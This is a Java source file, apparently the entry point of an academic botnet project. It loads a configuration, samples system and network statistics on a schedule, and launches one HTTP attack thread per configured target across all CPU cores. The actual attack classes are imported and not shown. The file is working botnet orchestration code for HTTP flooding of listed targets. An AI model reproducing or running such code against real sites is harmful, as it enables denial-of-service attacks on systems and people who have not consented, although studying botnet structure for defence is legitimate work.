/**
 * The MIT License (MIT)
 *
 * Copyright (c) 2016 Giacomo Marciani, Michele Porretta
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package com.acmutv.botnet;

import com.acmutv.botnet.attacks.NetworkSampler;
import com.acmutv.botnet.attacks.SystemSampler;
import com.acmutv.botnet.control.BotShutdown;
import com.acmutv.botnet.config.BotConfigurator;
import com.acmutv.botnet.config.BotConfiguration;
import com.acmutv.botnet.attacks.HTTPAttack;
import com.acmutv.botnet.model.Target;

import java.time.LocalDateTime;
import java.util.List;
import java.util.concurrent.*;

/**
 * This class realizes the bot entry-point.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 */
public class BotMain {

  /**
   * The bot main method, executed when the program is launched.
   * @param args The command line arguments.
   */
  public static void main(String[] args) {

    BotConfigurator.loadConfiguration(args);

    registerShutdownHooks(new BotShutdown());

    registerSamplers();

    registerHTTPAttackers();
  }

  /**
   * Registers both system and network samplers, according to the given configuration.
   */
  public static void registerSamplers() {
    BotConfiguration config = BotConfiguration.getInstance();
    final ScheduledExecutorService scheduler =
        Executors.newScheduledThreadPool(2);

    if (config.isSysStat()) {
      scheduler.scheduleAtFixedRate(
          new SystemSampler(), 0, config.getSysStatFreq(), TimeUnit.SECONDS);
    }

    if (config.isNetStat()) {
      scheduler.scheduleAtFixedRate(
          new NetworkSampler(), 0, config.getNetStatFreq(), TimeUnit.SECONDS);
    }

    scheduler.shutdown();

    long maxtime = config.getMaxTime();
    if (maxtime > 0) {
      try {
        if (scheduler.awaitTermination(maxtime, TimeUnit.SECONDS)) {
          System.out.format("[MAIN THREAD %s] SAMPLERS THREAD POOL SHUTDOWN\n",
              config.getDtf().format(LocalDateTime.now()));
        }
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
    }

  }

  /**
   * Registers HTTP attackers, according to the given configuration.
   */
  private static void registerHTTPAttackers() {
    BotConfiguration config = BotConfiguration.getInstance();
    int numcores = Runtime.getRuntime().availableProcessors();
    ExecutorService executor = Executors.newFixedThreadPool(numcores);

    for (Target tgt : config.getTargets()) {
      Runnable attacker = new HTTPAttack(tgt);
      executor.execute(attacker);
    }

    executor.shutdown();

    long maxtime = config.getMaxTime();
    if (maxtime > 0) {
      try {
        if (executor.awaitTermination(maxtime, TimeUnit.SECONDS)) {
          System.out.format("[MAIN THREAD %s] HTTP ATTACK THREAD POOL SHUTDOWN\n",
              config.getDtf().format(LocalDateTime.now()));
        }
      } catch (InterruptedException e) {
        e.printStackTrace();
      }
    }
  }

  /**
   * Registers atexit runnables as JVM shutdown hooks.
   * @param hooks atexit runnables.
   * @see Runtime
   * @see Thread
   * @see Runnable
   */
  private static void registerShutdownHooks(Runnable ...hooks) {
    Runtime runtime = Runtime.getRuntime();
    for (Runnable hook : hooks) {
      runtime.addShutdownHook(new Thread(hook));
    }
  }

  /**
   * Registers a periodic task.
   * @param task the task to execute.
   * @param delay the delay (in seconds) to first execution.
   * @param period the period (in seconds) between executions.
   */
  private static void registerPeriodic(Runnable task, long delay, long period) {
    final ScheduledExecutorService scheduler =
        Executors.newScheduledThreadPool(1);
    final ScheduledFuture<?> handler =
        scheduler.scheduleAtFixedRate(task, delay, period, TimeUnit.SECONDS);

    Runnable interrupt = () -> handler.cancel(true);

    long maxtime = BotConfiguration.getInstance().getMaxTime();
    if (maxtime > 0) {
      scheduler.schedule(interrupt, maxtime, TimeUnit.SECONDS);
    }
  }
}
